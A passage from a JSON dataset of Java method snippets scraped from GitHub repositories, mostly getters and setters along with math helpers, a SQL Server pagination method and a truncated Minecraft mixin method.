"https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32895, "method_name": "getFullName", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getFullName() {\n    return fullName;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32896, "method_name": "setFullName", "class_name": "WtssUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setFullName(String fullName) {\n    this.fullName = fullName;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32897, "method_name": "getDepartmentName", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getDepartmentName() {\n    return departmentName;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32898, "method_name": "setDepartmentName", "class_name": "WtssUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setDepartmentName(String departmentName) {\n    this.departmentName = departmentName;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32899, "method_name": "getEmail", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getEmail() {\n    return email;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32900, "method_name": "setEmail", "class_name": "WtssUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setEmail(String email) {\n    this.email = email;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32901, "method_name": "getProxyUsers", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getProxyUsers() {\n    return proxyUsers;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32902, "method_name": "setProxyUsers", "class_name": "WtssUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setProxyUsers(String proxyUsers) {\n    this.proxyUsers = proxyUsers;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32903, "method_name": "getRoleId", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getRoleId() {\n    return roleId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32904, "method_name": "setRoleId", "class_name": "WtssUser", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setRoleId(int roleId) {\n    this.roleId = roleId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32905, "method_name": "getUserType", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "  public int getUserType() {\n    return userType;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32906, "method_name": "setUserType", "class_name": "WtssUser", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setUserType(int userType) {\n    this.userType = userType;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32907, "method_name": "getCreateTime", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getCreateTime() {\n    return createTime;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32908, "method_name": "setCreateTime", "class_name": "WtssUser", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setCreateTime(long createTime) {\n    this.createTime = createTime;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32909, "method_name": "getUpdateTime", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getUpdateTime() {\n    return updateTime;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32910, "method_name": "setUpdateTime", "class_name": "WtssUser", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setUpdateTime(long updateTime) {\n    this.updateTime = updateTime;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32911, "method_name": "getDepartmentId", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "  public long getDepartmentId() {\n    return departmentId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32912, "method_name": "setDepartmentId", "class_name": "WtssUser", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setDepartmentId(long departmentId) {\n    this.departmentId = departmentId;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32913, "method_name": "getModifyInfo", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getModifyInfo() {\n    return modifyInfo;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32914, "method_name": "setModifyInfo", "class_name": "WtssUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setModifyInfo(String modifyInfo) {\n    this.modifyInfo = modifyInfo;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32915, "method_name": "getModifyType", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getModifyType() {\n    return modifyType;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32916, "method_name": "setModifyType", "class_name": "WtssUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setModifyType(String modifyType) {\n    this.modifyType = modifyType;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32917, "method_name": "getUserCategory", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String getUserCategory() {\n    return userCategory;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32918, "method_name": "setUserCategory", "class_name": "WtssUser", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void setUserCategory(String userCategory) {\n    this.userCategory = userCategory;\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32919, "method_name": "toString", "class_name": "WtssUser", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String toString() {\n    return \"WtssUser{\" +\n        \"userId='\" + userId + '\\'' +\n        \", username='\" + username + '\\'' +\n        \", fullName='\" + fullName + '\\'' +\n        \", departmentI='\" + departmentId + '\\'' +\n        \", departmentName='\" + departmentName + '\\'' +\n        \", email='\" + email + '\\'' +\n        \", proxyUsers='\" + proxyUsers + '\\'' +\n        \", roleId=\" + roleId +\n        \", userType=\" + userType +\n        \", createTime=\" + createTime +\n        \", updateTime=\" + updateTime +\n        \", modifyType=\" + modifyType +\n        \", modifyInfo=\" + modifyInfo +\n        \", userCategory=\" + userCategory +\n        '}';\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-common/src/main/java/com/webank/wedatasphere/schedulis/common/system/entity/WtssUser.java", "stars": "18", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32920, "method_name": "getPageSql", "class_name": "SQLServerDialect", "params": ["String", "RequestContext", "long", "long"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPageSql(String sql, RequestContext context, long offset, long limit) {\n        context.addParameter(offset);\n        context.addParameter(limit);\n        return sql + \" OFFSET ? ROWS FETCH NEXT ? ROWS ONLY\";\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss/master/src/main/java/org/ssssssss/dialect/SQLServerDialect.java", "stars": "13", "class_props": {"extends": null, "implements": ["Dialect"], "modifiers": ["public"]}}, {"id": 32921, "method_name": "weightedAverage", "class_name": "MathHelper", "params": ["float", "float", "float", "float"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float weightedAverage(float a, float aw, float b, float bw) {\n        return (a * aw + b * bw) / (aw + bw);\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32922, "method_name": "randInt", "class_name": "MathHelper", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int randInt() {\n        return rnd.nextInt();\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32923, "method_name": "randInt", "class_name": "MathHelper", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int randInt(int upper) {\n        return rnd.nextInt(upper);\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32924, "method_name": "randFloat", "class_name": "MathHelper", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float randFloat() {\n        return rnd.nextFloat();\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32925, "method_name": "randRangedFloat", "class_name": "MathHelper", "params": ["float", "float"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float randRangedFloat(float lower, float upper) {\n        return rnd.nextFloat() * (upper - lower) + lower;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32926, "method_name": "randRange", "class_name": "MathHelper", "params": ["float", "float"], "throws": null, "modifiers": ["public", "static"], "return_type": "Range", "snippet": "    public static Range randRange(float lower, float upper) {\n        float first = randRangedFloat(lower, upper);\n        float second = randRangedFloat(lower, upper);\n        return new Range(Math.min(first, second), Math.max(first, second));\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32927, "method_name": "randRange", "class_name": "MathHelper", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Range", "snippet": "    public static Range randRange() {\n        float first = randFloat();\n        float second = randFloat();\n        return new Range(Math.min(first, second), Math.max(first, second));\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32928, "method_name": "floor", "class_name": "MathHelper", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int floor(int in, int mod) {\n        return in - in % mod;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32929, "method_name": "distanceSq", "class_name": "MathHelper", "params": ["int", "int", "int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float distanceSq(int x1, int y1, int x2, int y2) {\n        return (float) (Math.pow(y1 - y2, 2) + Math.pow(x1 - x2, 2));\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32930, "method_name": "distanceB2B", "class_name": "MathHelper", "params": ["BlockPos", "BlockPos"], "throws": null, "modifiers": ["public", "static"], "return_type": "double", "snippet": "    public static double distanceB2B(BlockPos pos1, BlockPos pos2) {\n        return pos1.getDistance(pos2.getX(), pos2.getY(), pos2.getZ());\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32931, "method_name": "withChance", "class_name": "MathHelper", "params": ["float"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean withChance(float chance) {\n        return rnd.nextFloat() < chance;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32932, "method_name": "denormalize", "class_name": "MathHelper", "params": ["float", "float", "float"], "throws": null, "modifiers": ["public", "static"], "return_type": "float", "snippet": "    public static float denormalize(float in, float upper, float lower) {\n        return (upper - lower) * in + lower;\n    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Auxiliary/Helper/MathHelper.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32933, "method_name": "getPage", "class_name": "PageConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPage() {\n        return page;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss-spring-boot-starter/master/src/main/java/org/ssssssss/spring/boot/starter/PageConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32934, "method_name": "setPage", "class_name": "PageConfig", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPage(String page) {\n        this.page = page;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss-spring-boot-starter/master/src/main/java/org/ssssssss/spring/boot/starter/PageConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32935, "method_name": "getSize", "class_name": "PageConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSize() {\n        return size;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss-spring-boot-starter/master/src/main/java/org/ssssssss/spring/boot/starter/PageConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32936, "method_name": "setSize", "class_name": "PageConfig", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSize(String size) {\n        this.size = size;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss-spring-boot-starter/master/src/main/java/org/ssssssss/spring/boot/starter/PageConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32937, "method_name": "getDefaultPage", "class_name": "PageConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getDefaultPage() {\n        return defaultPage;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss-spring-boot-starter/master/src/main/java/org/ssssssss/spring/boot/starter/PageConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32938, "method_name": "setDefaultPage", "class_name": "PageConfig", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDefaultPage(long defaultPage) {\n        this.defaultPage = defaultPage;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss-spring-boot-starter/master/src/main/java/org/ssssssss/spring/boot/starter/PageConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32939, "method_name": "getDefaultSize", "class_name": "PageConfig", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getDefaultSize() {\n        return defaultSize;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss-spring-boot-starter/master/src/main/java/org/ssssssss/spring/boot/starter/PageConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32940, "method_name": "setDefaultSize", "class_name": "PageConfig", "params": ["long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDefaultSize(long defaultSize) {\n        this.defaultSize = defaultSize;\n    }", "url": "https://raw.githubusercontent.com/javamxd/ssssssss-spring-boot-starter/master/src/main/java/org/ssssssss/spring/boot/starter/PageConfig.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32941, "method_name": "getUrl", "class_name": "GSYModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUrl() {\n        return url;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32942, "method_name": "setUrl", "class_name": "GSYModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setUrl(String url) {\n        this.url = url;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32943, "method_name": "getMapHeadData", "class_name": "GSYModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Map<String,String>", "snippet": "    public Map<String, String> getMapHeadData() {\n        return mapHeadData;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32944, "method_name": "setMapHeadData", "class_name": "GSYModel", "params": ["Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setMapHeadData(Map<String, String> mapHeadData) {\n        this.mapHeadData = mapHeadData;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32945, "method_name": "isLooping", "class_name": "GSYModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isLooping() {\n        return looping;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32946, "method_name": "setLooping", "class_name": "GSYModel", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLooping(boolean looping) {\n        this.looping = looping;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32947, "method_name": "getSpeed", "class_name": "GSYModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getSpeed() {\n        return speed;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32948, "method_name": "setSpeed", "class_name": "GSYModel", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSpeed(float speed) {\n        this.speed = speed;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32949, "method_name": "isCache", "class_name": "GSYModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isCache() {\n        return isCache;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32950, "method_name": "setCache", "class_name": "GSYModel", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCache(boolean cache) {\n        isCache = cache;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32951, "method_name": "getCachePath", "class_name": "GSYModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "File", "snippet": "    public File getCachePath() {\n        return mCachePath;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32952, "method_name": "setCachePath", "class_name": "GSYModel", "params": ["File"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCachePath(File cachePath) {\n        this.mCachePath = cachePath;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32953, "method_name": "getOverrideExtension", "class_name": "GSYModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOverrideExtension() {\n        return overrideExtension;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32954, "method_name": "setOverrideExtension", "class_name": "GSYModel", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOverrideExtension(String overrideExtension) {\n        this.overrideExtension = overrideExtension;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/model/GSYModel.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32955, "method_name": "onOrientationChanged", "class_name": "Listener", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onOrientationChanged (int p0)\n\t{\n\t\tn_onOrientationChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/Listener.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32956, "method_name": "n_onOrientationChanged", "class_name": "Listener", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onOrientationChanged (int p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/Listener.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32957, "method_name": "monodroidAddReference", "class_name": "Listener", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/Listener.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32958, "method_name": "monodroidClearReferences", "class_name": "Listener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/crc64a0e0a82d0db9a07d/Listener.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 32959, "method_name": "onJump", "class_name": "MixinEntityLivingBase", "params": ["CallbackInfo"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void onJump(CallbackInfo callbackInfo) {\n        JumpEvent event = new JumpEvent(getLocation());\n        